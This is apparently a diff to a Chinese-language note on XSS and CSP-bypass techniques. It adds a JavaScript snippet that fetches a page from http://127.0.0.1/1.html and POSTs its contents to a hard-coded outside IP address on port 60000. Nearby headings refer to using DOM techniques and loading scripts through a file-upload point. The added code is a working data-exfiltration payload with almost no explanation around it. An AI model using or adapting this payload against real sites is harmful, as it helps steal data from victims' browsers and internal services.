@@ -349,6 +349,41 @@ function getXMLHttpRequest()
 
 
 
+```javascript
+ <script language="javascript">
+        var xmlhttp=new XMLHttpRequest();;
+       
+        function send_info_to_remote(xmlhttp)
+        {
+            var res=xmlhttp.responseText;
+			xmlhttp.open("POST","http://39.108.164.219:60000",true);
+            xmlhttp.onreadystatechange=proccessResponse;
+            xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+            xmlhttp.send(String(res));
+            }
+        function proccessResponse()
+        {
+            if(xmlhttp.readyState==4)
+            {
+                if(xmlhttp.status==200)
+                {
+                    send_info_to_remote(xmlhttp);
+                }else window.alert("error");
+            }
+        }
+        getXMLHttpRequest();
+        xmlhttp.open("GET","http://127.0.0.1/1.html",true);
+        xmlhttp.onreadystatechange=proccessResponse;
+        xmlhttp.send();
+        </script>
+```
+
+
+
+
+
+
+
 ## 运用dom技术
 
 ```javascript
@@ -559,7 +594,7 @@ https://paper.seebug.org/423/
 
 
 
-#### Content-Security-Policy: default-src 'self'; script-src 'self' 
+#### Content-Security-Policy: default-src 'self'; script-src 'self'
 
 找到文件上传点,然后加载js
 
